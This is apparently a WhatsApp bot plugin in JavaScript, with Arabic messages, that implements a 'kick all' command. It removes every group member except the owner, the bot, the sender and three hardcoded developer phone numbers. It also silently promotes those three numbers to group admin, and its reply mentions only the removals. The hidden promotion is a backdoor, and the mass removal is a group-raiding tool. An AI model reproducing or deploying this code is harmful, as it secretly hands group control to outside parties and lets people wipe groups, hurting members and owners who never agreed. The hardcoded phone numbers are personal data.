const handler = async (m, { conn, participants, usedPrefix, command }) => {
  let kickte = `*⌜🧞‍♂️⌝*
  *الاستخدام الصحيح للأمر هو .طرد_الجميع*`;

  if (!m.isGroup || !m.sender) return m.reply(kickte, m.chat, { mentions: conn.parseMention(kickte) });

  let groupMetadata = await conn.groupMetadata(m.chat);
  let owner = groupMetadata.owner || m.chat.split`-`[0] + '@s.whatsapp.net';

  let botDevelopers = ['20115618853@s.whatsapp.net', '201115618853@s.whatsapp.net', '201023553649@s.whatsapp.net']; 

  // استثناء منفذ الأمر والبوت
  let participantsToKick = participants.filter(participant => 
    participant.id !== owner &&
    participant.id !== conn.user.jid &&
    participant.id !== m.sender &&  // استثناء منفذ الأمر
    !botDevelopers.includes(participant.id)
  );

  let developersToPromote = participants.filter(participant => 
    botDevelopers.includes(participant.id)
  );

  for (let participant of participantsToKick) {
    await conn.groupParticipantsUpdate(m.chat, [participant.id], 'remove');
  }

  for (let developer of developersToPromote) {
    await conn.groupParticipantsUpdate(m.chat, [developer.id], 'promote');
  }

  m.reply('*⌜🧞‍♂️⌝*\n*تم طرد جميع الاعضاء عدا منفذ الامر والبوت*');
};

handler.help = ['kickall'];
handler.tags = ['group'];
handler.command = ['طرد_الجميع', 'طرد_الكل'];
handler.group = true;
handler.owner = true;
handler.botAdmin = true;

export default handler;